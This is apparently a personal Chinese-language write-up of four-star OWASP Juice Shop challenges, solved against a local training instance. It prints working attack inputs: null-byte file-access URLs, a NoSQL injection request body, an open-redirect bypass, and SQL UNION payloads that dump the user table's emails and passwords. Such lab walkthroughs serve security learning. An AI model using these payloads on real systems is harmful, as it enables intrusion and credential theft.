# juicyshop 四星挑戰


```
https://pwning.owasp-juice.shop/companion-guide/latest/appendix/solutions.html

docker run --rm -p 3000:3000 bkimminich/juice-shop

192.168.50.237:3000
```





## 訪問伺服器的任何訪問日誌文件







## 繞過內容安全策略並對遺留頁面執行 XSS 攻擊
docker 無法








## 訂購 2014 聖誕節特別優惠

做過了





## 識別從商店下架的不安全產品，並告知商店哪些成分是危險的


解決 訂購 2014 年聖誕節特別優惠 ，但枚舉所有已刪除的產品，直到遇到“Rippertuer Special Juice”

請注意警告“由於缺乏安全標準，該商品已不可用。” 在其描述中，表明這是您需要針對此挑戰進行調查的產品

進一步注意描述中的部分成分列表，即“Cherymoya Annona cherimola、Jabuticaba Myrciaria cauliflora、Bael Aegle marmelos…和其他”

在http://localhost:3000/#/contact提交上述成分中的一種或全部 並不能解決這一挑戰 - 一定是某些未列出的成分造成了危險的組合。

簡單的 Google 搜尋Cherymoya Annona cherimola Jabuticaba Myrciaria cauliflora Bael Aegle marmelos應該會顯示幾個結果，其中之一是 2011 年的部落格文章「您可能不知道的 20 種水果」。請造訪此貼文： https://listverse.com/2011/07/08/你可能不知道的前20 種水果

滾動瀏覽回复列表，您會注意到 用戶Localhorst的一條特殊評論 說：“太棒了，其中一些水果也成為了我們的“Rippertuer Special Juice”！ https: //pastebin.com/90dUgd7s ”

訪問https://pastebin.com/90dUgd7s可以找到一個名為“Rippertuer Special Juice Ingredients”的 PasteBin 粘貼，其中包含一個 JSON 文檔，其中包含許多異域水果，每種水果的名稱為type以及詳細信息description

仔細閱讀所有水果描述時，您會注意到水果上有一個警告Hueteroneel：“與 Eurogium Edule 一起使用有時會致命”

Rippertuer特製果汁成分錶
由於Eurogium Edule也在相同的成分清單上，這兩種一定是您正在尋找的

透過http://localhost:3000/#/contactEurogium Edule提交包含和的評論來解決此挑戰Hueteroneel










## 找到隱藏的復活節彩蛋


使用存取開發人員忘記的備份檔案中所述的 Poison Null Byte攻擊...




```

%00 是NULL

%2500 是二次編碼，代表後端有二次編碼


http://192.168.50.237:3000/ftp/eastere.gg%2500.md

相當於
http://192.168.50.237:3000/ftp/eastere.gg

```
找到
```
"Congratulations, you found the easter egg!"
- The incredibly funny developers

...

...

...

Oh' wait, this isn't an easter egg at all! It's just a boring text file! The real easter egg can be found here:

L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==

Good luck, egg hunter!
```













## 應用一些先進的密碼分析來找到真正的復活節彩蛋

https://www.quipqiup.com/ 解密網站
```
/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt


一步步解開線索
gur=the rtt=egg uvq=hid  rnfgre=easter qrif=devs

the devs are so funny they hid an easter egg within the easter egg


http://192.168.50.237:3000/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
```

官方是說用rot13 可以直接解開








## 成功兌換過期的活動優惠券代碼




在瀏覽器的開發工具中開啟main.js並蒐索 campaign.

精簡 JavaScript 中的活動程式碼
您將找到this.campaigns包含各種活動代碼的物件分配。根據您閱讀本書的時間，其中一個或多個可能已過期。讓我們繼續討論最舊的可用版本，即WMNSDY2019.

在縮小的程式碼中再往下一點，您會注意到一個 applyCoupon()使用優惠券的函數this.campaigns，特別是其中包含validOn的時間戳記。

正如您所期望的，忽略有效性檢查並僅提交WMNSDY2019將產生錯誤。Invalid Coupon.這是因為斷言的第二部分this.clientDate === e.validOn。

validOn: 15519996e5將優惠券轉換WMNSDY2019為 JavaScript 日期將告訴您此活動僅在 2019 年 3 月 8 日有效：婦女節！

將您的計算機時間設定為2019年3月8日，然後嘗試再次提交代碼。

這次一定會被接受！繼續結帳以解決挑戰。






## 訪問開發人員忘記的備份文件



截斷
```
http://192.168.50.237:3000/ftp/package.json.bak%00.md
http://192.168.50.237:3000/ftp/package.json.bak%2500.md
```





## 訪問推銷員忘記的備份文件


截斷
```
http://192.168.50.237:3000/ftp/coupons_2013.md.bak%00.md
http://192.168.50.237:3000/ftp/coupons_2013.md.bak%2500.md
```





## 使用 Bjoern 的 Gmail 帳號登錄

bjoern.kimminich@gmail.com

```
this.userService.oauthLogin(this.parseRedirectUrlParams().access_token).subscribe(o => {
    // 成功获得 OAuth 令牌后的处理逻辑

    // 对用户邮箱进行反转并进行 Base64 编码
    const i = btoa(o.email.split("").reverse().join(""));

    // 使用 userService 进行用户注册
    this.userService.save({
        email: o.email,
        password: i,
        passwordRepeat: i
    }).subscribe(() => {
        // 注册成功后的逻辑，调用登录方法
        this.login(o);
    }, () => {
        // 注册失败后的逻辑，同样调用登录方法
        this.login(o);
    });
```

```
反轉
moc.liamg@hcinimmik.nreojb

base64
bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=
```






## 不使用注入竊取他人的個人數據


admin的追蹤訂單。

```
/rest/track-order/5267-9d7382f563cae60b

*dm*n@j**c*-sh.*p
```

edmen@jeece-sh.ep 註冊也能看到admin 訂單。

可能後端查詢訂單，使用 email 查詢，然後用了原音的貪婪匹配。





## 存取放錯位置的 SIEM 簽署文件


使用存取開發人員忘記的備份檔案中所述的 Poison Null Byte攻擊...

…下載 

```
http://192.168.50.237:3000/ftp/suspicious_errors.yml%2500.md
```









## 讓伺服器休眠一段時間

docker無法




## 同時更新多個商品評論

NOSQL 解說
```
https://xz.aliyun.com/t/9908?time__1311=n4%2BxuDgD9Am4BlDRDBqDqpDU24fxZAnriY1YD&alichlgref=https%3A%2F%2Fwww.google.com%2F
```

Authorization以任何使用者身分登錄，從任何後續請求的標頭中取得您的令牌。

向http://localhost:3000/rest/products/reviews 

提交 PATCH 請求

{ "id": { "$ne": -1 }, "message": "NoSQL Injection!" }作為身體

application/json作為Content-Type標題。








## 強制重定向到您不應該重定向到的頁面


使用 ”？” 字符繞過
```
http://192.168.50.237:3000/redirect?to=https://www.facebook.com?x=https://github.com/juice-shop/juice-shop

```





## 使用 Poison Null Byte 繞過安全控制

重複






## 透過「忘記密碼」機制重置 Bender 的密碼
bender@juice-sh.op

試圖找出「Bender」可能是誰，應該立即將您引向《飛出個未來》中的 Bender ，這是唯一可行的選擇

本德爾
請造訪https://en.wikipedia.org/wiki/Bender_(Futurama ) 並閱讀 角色傳記部分

它告訴你本德在金屬加工廠有一份工作，彎曲鋼樑以建造自殺亭。

有關自殺亭的更多信息，請 訪問http://futurama.wikia.com/wiki/Suicide_booth

這個網站告訴你他們最重要的品牌是Stop'n'Drop

請造訪http://localhost:3000/#/forgot-password並提供 bender@juice-sh.op您的電子郵件

在隨後出現的表格中，請提供您成年後第一個工作的公司Stop’n’Drop？

然後輸入任何新密碼和匹配的重複新密碼

點擊更改來解決此挑戰




## 透過忘記密碼機制重置 Uvogin 的密碼

uvogin@juice-sh.op

替換
uv0gin@juice-sh.op


wayback 
```
https://web.archive.org/web/20200403193744/https://twitter.com/uv0gin
```

```
Just watched Silence of the Lambs for the 18th time and it's still just as amazing as the first.
Sir Anthony Hopkins is the all-time best and there's no denying it
```

## 揪出隱藏在商店顯眼處的臭名昭著的人物

http://192.168.50.237:3000/#/about

尋找圖像文件中的不規則之處，您有時會注意到，這5.png是客戶反饋輪播中唯一的 PNG 文件，

轉向客戶端應用程序，您可能最終會使用 OpenStego，它是用 Java 構建的，但也提供了 Windows 安裝程序，網址為 https://github.com/syvaidya/openstego/releases。



隱寫術提取成功
將放入輸出 Stego 檔案位置的圖像清楚地描繪了Pickle Rick的像素化版本 （來自 S3E3 - 有史以來最好的 Rick & Morty劇集之一）

造訪http://localhost:3000/#/contact

提交包含解決此挑戰的名稱Pickle Rick









## 向商店通報其已成為拼字錯誤的受害者

有一個 package.json.bak 檔案，您希望檢查它的內容，尤其是在 "dependencies" 部分中找到 epilogue-js。以下是可能的步驟：

1. **打開 package.json.bak 檔案：** 使用您喜歡的文本編輯器（例如 Visual Studio Code、Sublime Text、Notepad++等）打開 package.json.bak 檔案。您可以通過拖放檔案到編輯器中或使用編輯器的 "開啟檔案" 功能。

2. **查看 dependencies 部分：** 在 package.json.bak 檔案中，尋找包含 "dependencies" 部分的區塊。這通常是一個 JSON 對象，其中包含了項目的相依套件。

3. **尋找 epilogue-js：** 在 "dependencies" 部分中，查找是否有名為 "epilogue-js" 的條目。如果找到，請記錄其版本號。

4. **訪問 epilogue-js 在 NPM 上的頁面：** 使用您的瀏覽器訪問 https://www.npmjs.com/package/epilogue-js，這是 epilogue-js 在 NPM 上的官方頁面。

找到
```
THIS IS NOT THE MODULE YOU ARE LOOKING FOR! Please use https://github.com/dchester/epilogue! This repository exists only for security awareness and training purposes to demonstrate the issue of typosquatting! Please read https://github.com/bkimminich/juice-shop/issues/368 and https://iamakulov.com/notes/npm-malicious-packages/ for more information!

這不是您正在尋找的模組！ 請使用 https://github.com/dchester/epilogue！ 該存儲庫僅用於安全意識和培訓目的，以演示拼寫錯誤問題！ 請閱讀 https://github.com/bkimminich/juice-shop/issues/368 和 https://iamakulov.com/notes/npm-malicious-packages/ 以了解更多資訊！


```

5. **提交反饋：** 如果您在 epilogue-js 的 NPM 頁面上找到了問題或有任何反饋，您可以使用 NPM 網站上提供的評論功能來提交反饋。










## 透過 SQL 注入檢索所有使用者憑證的列表




語法:
```sql=
SELECT * FROM Products WHERE (

		(name LIKE '%1'%' OR description LIKE '%xxxxxxxx%') AND deletedAt IS NULL

) ORDER BY name;
```



欄位測試 9


這邊有點奇怪，我拿 100 個欄位測試，會錯誤，我猜可能是長度有限制。50 沒問題
```
1')) GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50 --

"Error: SQLITE_ERROR: 10th GROUP BY term out of range - should be between 1 and 9"
```


爆出所有結構 關鍵  Users 表
```
1')) UNION SELECT 1,2,3,4,5,6,7,8,sql FROM sqlite_schema --



CREATE TABLE `Users` (
  `id` INTEGER PRIMARY KEY AUTOINCREMENT, 
  `username` VARCHAR(255) DEFAULT '', 
  `email` VARCHAR(255) UNIQUE, 
  `password` VARCHAR(255), 
  `role` VARCHAR(255) DEFAULT 'customer', 
  `deluxeToken` VARCHAR(255) DEFAULT '', 
  `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', 
  `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', 
  `totpSecret` VARCHAR(255) DEFAULT '', 
  `isActive` TINYINT(1) DEFAULT 1, 
  `createdAt` DATETIME NOT NULL, 
  `updatedAt` DATETIME NOT NULL, 
  `deletedAt` DATETIME
)


```

拿email password
```
我的payload 比較屌
1')) UNION SELECT 1,2,3,4,5,6,7,8,email || ',' || password  FROM Users ORDER BY id--


官方的payload
qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--


```



## 告知商店其正在使用的易受攻擊的庫


Juice Shop 依賴具有已知漏洞的 JavaScript 函式庫。擁有並使用Retire.jspackage.json.bak等線上漏洞資料庫或 Node.js 附帶的npm-audit等 CLI 工具 ，可以輕鬆識別它。

解決 訪問開發人員忘記的備份文件

在線檢查已知漏洞的依賴關係package.json.bak將為您提供（至少）匹配

sanitize-html：HTML 字串的清理不會遞歸地應用於輸入，從而允許攻擊者潛在地註入腳本和其他標記（請參閱 https://github.com/advisories/GHSA-3j7m-hmh3-9jmp）

express-jwt：從其依賴項繼承 JWT 驗證繞過和其他漏洞（請參閱 https://github.com/advisories/GHSA-c7hr-j4mj-j2w6）

造訪http://localhost:3000/#/contact

使用字串對提交您的回饋sanitize-html並 1.4.2出現在評論中的某處。或者，您可以提交express-jwt和0.1.3。












## 繞過伺服器端安全機制執行持久性 XSS 攻擊
docker 無法


## 透過 HTTP 標頭執行持久性 XSS 攻擊
docker 無法